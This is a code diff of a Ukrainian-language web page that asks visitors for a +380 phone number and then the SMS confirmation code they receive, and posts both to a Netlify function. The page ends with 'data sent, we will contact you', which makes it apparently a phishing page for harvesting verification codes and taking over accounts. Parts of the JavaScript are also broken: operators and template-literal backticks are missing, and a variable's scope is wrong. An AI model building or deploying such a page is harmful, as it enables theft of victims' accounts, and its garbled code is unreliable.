@@ -37,7 +37,7 @@
             background-size: 400% 400%;
             animation: backgroundAnimation 15s ease infinite;
         }
-        
+
         @keyframes backgroundAnimation {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
@@ -69,11 +69,11 @@
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        
+
         .logo-container {
             margin-bottom: 25px;
         }
-        
+
         .logo-container svg {
             width: 60px;
             height: 60px;
@@ -103,7 +103,7 @@
             line-height: 1.6;
             color: #c0c0c0;
         }
-        
+
         .main-subtitle {
             font-weight: 600;
             font-size: 18px;
@@ -124,22 +124,21 @@
             background: linear-gradient(90deg, var(--gradient-start), var(--gradient-mid));
             background-size: 200% 200%;
             animation: buttonShine 3s ease infinite;
-
-position: relative;
-            z-index: 10; /* Добавлено для предотвращения перекрытия */
+            position: relative;
+            z-index: 10;
         }
-        
+
         @keyframes buttonShine {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
 
-        .button:hover {
+.button:hover {
             transform: translateY(-3px) scale(1.02);
             box-shadow: 0 5px 20px rgba(255, 215, 0, 0.3);
         }
-        
+
         .button:disabled {
             background: #555;
             cursor: not-allowed;
@@ -149,7 +148,7 @@ position: relative;
         .form-group {
             margin-bottom: 20px;
         }
-        
+
         .phone-input-wrapper {
             display: flex;
             align-items: center;
@@ -159,7 +158,7 @@ position: relative;
             padding: 0 15px;
             transition: all 0.3s ease;
         }
-        
+
         .phone-input-wrapper:focus-within {
             border-color: var(--gradient-start);
             box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
@@ -182,7 +181,7 @@ position: relative;
             font-family: 'Poppins', sans-serif;
             font-weight: 600;
         }
-        
+
         .input-field:focus {
             outline: none;
         }
@@ -199,13 +198,13 @@ position: relative;
             color: var(--text-color);
             transition: all 0.3s ease;
         }
-        
+
         #code-input:focus {
             outline: none;
             border-color: var(--gradient-start);
             box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
         }
-        
+
         .loader {
             border: 4px solid #333;
             border-top: 4px solid var(--gradient-start);
@@ -216,7 +215,7 @@ position: relative;
             margin: 20px auto;
             display: none;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -224,19 +223,21 @@ position: relative;
     </style>
 </head>
 <body>
-    
     <svg width="0" height="0" style="position:absolute;">
-      <defs>
-        <linearGradient id="logoGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-          <stop offset="0%" style="stop-color:var(--gradient-start);stop-opacity:1" />
-          <stop offset="100%" style="stop-color:var(--gradient-mid);stop-opacity:1" />
-        </linearGradient>
-      </defs>
+        <defs>
+            <linearGradient id="logoGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:var(--gradient-start);stop-opacity:1" />
+                <stop offset="100%" style="stop-color:var(--gradient-mid);stop-opacity:1" />
+            </linearGradient>
+        </defs>
     </svg>
 
     <div class="card">
         <div class="logo-container">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 4H4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4ZM20 18H4V6H20V18Z"/><path d="M20 9H16C15.4477 9 15 9.44772 15 10V14C15 14.5523 15.4477 15 16 15H20V9Z"/></svg>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M20 4H4C2.89543 4 2 4.89543 2 6V18C2 19.1046 2.89543 20 4 20H20C21.1046 20 22 19.1046 22 18V6C22 4.89543 21.1046 4 20 4ZM20 18H4V6H20V18Z"/>
+                <path d="M20 9H16C15.4477 9 15 9.44772 15 10V14C15 14.5523 15.4477 15 16 15H20V9Z"/>
+            </svg>
         </div>
 
         <div id="welcome-screen" class="screen active">
@@ -246,11 +247,10 @@ position: relative;
         </div>
 
         <div id="phone-screen" class="screen">
-
-<h1>Авторизуйся щоб почати</h1>
+            <h1>Авторизуйся щоб почати</h1>
             <p>Введіть ваш номер телефону для продовження.</p>
             <div class="form-group">
-                 <div class="phone-input-wrapper">
+                <div class="phone-input-wrapper">
                     <span class="phone-prefix">+380</span>
                     <input type="tel" id="phone-input" class="input-field" placeholder="XX XX XXX XX" maxlength="12">
                 </div>
@@ -258,7 +258,7 @@ position: relative;
             <button id="auth-btn" class="button">Авторизуватись</button>
         </div>
 
-        <div id="code-screen" class="screen">
+<div id="code-screen" class="screen">
             <h1>Очікуйте на смс з кодом</h1>
             <p>Ми відправили код підтвердження на ваш номер.</p>
             <div class="form-group">
@@ -271,8 +271,7 @@ position: relative;
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('DOM fully loaded'); // Отладка: проверяем загрузку DOM
-
+            console.log('DOM загружен'); // Отладка
             const welcomeScreen = document.getElementById('welcome-screen');
             const phoneScreen = document.getElementById('phone-screen');
             const codeScreen = document.getElementById('code-screen');
@@ -282,78 +281,77 @@ position: relative;
             const phoneInput = document.getElementById('phone-input');
             const codeInput = document.getElementById('code-input');
             const loader = document.getElementById('loader');
-            
-            let userPhoneNumber = '';
 
-            // Проверяем, что все элементы найдены
-            if (!startBtn  !welcomeScreen  !phoneScreen) {
-                console.error('One or more elements not found:', { startBtn, welcomeScreen, phoneScreen });
+            // Проверка наличия элементов
+            if (!startBtn  !welcomeScreen  !phoneScreen  !codeScreen  !authBtn  !codeBtn  !phoneInput  !codeInput  !loader) {
+                console.error('Ошибка: один или несколько элементов не найдены');
+                alert('Ошибка загрузки страницы. Попробуйте обновить.');
                 return;
             }
 
+            // Кнопка "Почати"
             startBtn.addEventListener('click', () => {
-                console.log('Start button clicked'); // Отладка: проверяем клик
+                console.log('Кнопка "Почати" нажата'); // Отладка
                 welcomeScreen.classList.remove('active');
                 phoneScreen.classList.add('active');
             });
 
+            // Кнопка "Авторизуватись"
             authBtn.addEventListener('click', async () => {
                 const rawPhone = phoneInput.value.replace(/\s/g, '');
                 if (rawPhone.length !== 9) {
-                    alert('Будь ласка, введіть повний номер телефону.');
+                    alert('Введите полный номер телефона.');
                     return;
                 }
-                userPhoneNumber = +380${rawPhone};
+                const userPhoneNumber = +380${rawPhone};
                 authBtn.disabled = true;
-                authBtn.textContent = 'Відправка...';
+                authBtn.textContent = 'Отправка...';
                 try {
-                    const response = await fetch('/api/submit', { 
+                    const response = await fetch('/.netlify/functions/api', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ type: 'phone', data: userPhoneNumber }),
                     });
-                    if (!response.ok) {
-                        throw new Error(HTTP error! status: ${response.status});
-                    }
+                    if (!response.ok) throw new Error(Ошибка HTTP: ${response.status});
                     phoneScreen.classList.remove('active');
                     codeScreen.classList.add('active');
                 } catch (error) {
-                    console.error('Fetch error:', error);
-                    alert('Сталася помилка. Спробуйте ще раз.');
+                    console.error('Ошибка fetch:', error);
+                    alert('Ошибка при отправке номера. Попробуйте снова.');
                 } finally {
                     authBtn.disabled = false;
                     authBtn.textContent = 'Авторизуватись';
                 }
             });
 
+            // Кнопка "Подтвердить"
             codeBtn.addEventListener('click', async () => {
                 const code = codeInput.value.replace(/\s/g, '');
                 if (code.length < 4) {
-
-alert('Будь ласка, введіть код.');
+                    alert('Введите код.');
                     return;
                 }
                 codeBtn.style.display = 'none';
                 loader.style.display = 'block';
                 try {
-                    const response = await fetch('/api/submit', {
+                    const response = await fetch('/.netlify/functions/api', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code } }),
+
+body: JSON.stringify({ type: 'code', data: { phone: userPhoneNumber, code } }),
                     });
-                    if (!response.ok) {
-                        throw new Error(HTTP error! status: ${response.status});
-                    }
+                    if (!response.ok) throw new Error(Ошибка HTTP: ${response.status});
                     document.querySelector('.card').innerHTML = '<h1>Дякуємо!</h1><p>Ваші дані успішно відправлено. Ми скоро з вами зв\'яжемося.</p>';
                 } catch (error) {
-                    console.error('Fetch error:', error);
-                    alert('Сталася помилка при відправці коду. Спробуйте ще раз.');
+                    console.error('Ошибка fetch:', error);
+                    alert('Ошибка при отправке кода. Попробуйте снова.');
                 } finally {
                     codeBtn.style.display = 'block';
                     loader.style.display = 'none';
                 }
             });
 
+            // Форматирование ввода телефона
             phoneInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '');
                 let formatted = '';
